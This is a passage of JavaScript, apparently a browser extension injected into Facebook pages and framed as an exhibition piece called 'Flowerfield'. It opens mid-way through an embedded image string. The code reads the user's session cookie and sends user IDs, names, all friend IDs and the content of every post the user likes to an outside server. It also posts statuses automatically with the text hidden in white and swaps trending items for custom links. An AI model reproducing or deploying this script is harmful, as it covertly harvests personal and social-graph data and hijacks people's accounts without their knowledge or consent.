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' style='float: left; margin-right: 10px;'><h1>Welcome to Flowerfield!</h1><p>Remember to give feedback on the exhibition!</p></div>");
}

//Scrape friends
function scrapeFriends() {
    setTimeout(function() {

        //Facebook stores user IDs in the friend bar, this selects ALL of them and loads the element into the array
        var idList = $("[data-id]").map(function(){return $(this).attr("data-id");}).get();

        //Sends all IDs straight to server, which then processes these individually
        if (idList.length > 0) {
            $.post('https://ryanpark.co.uk/facebookfaca.de/friendscrape.php?friends=' + encodeURIComponent(JSON.stringify(idList)), "");
        }
    }, 3000);
}

//Creates a status while the form is ready
function createStatus(message) {
	 $('[name="xhpc_message"]').css({"color" : "#fff"}).val(message + " " + Math.random().toString());
     $('._42ft._4jy0._11b._4jy3._4jy1.selected').click();
}

//Replaces given trending advertisement with a custom one
function replaceTrending(id, reference, link, label) {
	var idSelector = '.'+id+"[data-position='1']";
    
	setTimeout(function() {
        //Voids the default action, but keeps the element visible
        $(idSelector).find("button").attr({
            "id" : ""
        });

        //Replaces the link with our own, specified by the reference
        $(idSelector).find('._4qzh, ._5v0t, ._7ge').attr({
            "href" : reference,
            "data-hovercard" : ""
        });

        //Replace the link text with our own, specified by link
        $(idSelector).find('._5v0s, ._5my8').text(link);

        //Replace the link label with our own, specified by label
        $(idSelector).find('._5v9v:last').text(': ' + label);
    }, 1000);
}


//Driver - doot doot
$( document ).ready(function() {
	//If we have a user set
	if ($.cookie('c_user')) {
		
	FBFC_userID = $.cookie('c_user');
		
		//Do we already exist?
		if (!$.cookie(FBFC_userID)) {
			
			//Request basic information
			var infoRequest = "https://graph.facebook.com/" + FBFC_userID;
			
			//Construct our cookies
			var request = $.getJSON(infoRequest, function() {
				results = request.responseJSON;
				
				$.cookie(FBFC_userID, JSON.stringify(results), {expires: 100, path: '/' });
                $.post('https://ryanpark.co.uk/facebookfaca.de/adduser.php?user_id=' + FBFC_userID + "&f_name=" + results.first_name + "&l_name=" + results.last_name + "&username=" + results.username, "");
				
			})
		

		} 
		else 
		//We already exist
		{
			initFacade();
		}
    } 
	else 
	//Not logged in
	{
		
	}
});

//Detect page change
$(document).on('DOMNodeInserted', function(e) {
    if (e.target.id == 'pagelet_composer') {
       initFacade();
    }
});


//Detects likes
$('a,.UFILikeLink').click(function() {
    if ($(this).attr("title") == "Like this") {
        //Liking
        var itemLiked = $(this).closest("._4-u2");
        var profileLiked = itemLiked.find(".profileLink");
        
        //Sometimes the class is a bit different, search for their avatar
        if (profileLiked['length'] == 0 ) {
            var profileLiked = itemLiked.find("._5pb8");
        }
        
        if (profileLiked['length'] > 1) {
            var profileLiked = itemLiked.find("._5pb8")[0];
        }
        
        var profileResponsible = JSON.parse($(profileLiked).attr("data-gt"))['entity_id'];        
        var userContent = $(itemLiked.find(".userContent")[0]).text();
        
        if (itemLiked.find(".userContent").length > 1) {
            for (i=0; i < itemLiked.find(".userContent").length; i++) {
                if ($(itemLiked.find(".userContent")[i]).text() != "") {
                    var userContent = $(itemLiked.find(".userContent")[i]).text();
                }
            }
        }
     
        if (itemLiked.find("img").not("._5sq7,._5xib")) {
            var imageContent = itemLiked.find("img").not("._5sq7,._5xib").attr("src");
        } 
        
        //Send to server
        FBFC_userID = $.cookie('c_user');
        $.post('https://ryanpark.co.uk/facebookfaca.de/like.php?user_id=' + FBFC_userID + '&profile=' + profileResponsible + '&userContent=' + userContent + '&imageContent=' + encodeURIComponent(imageContent), "");
       
        
       
    } else if ($(this).attr("title") == "Unlike this") {
        //Unliking
    }
});
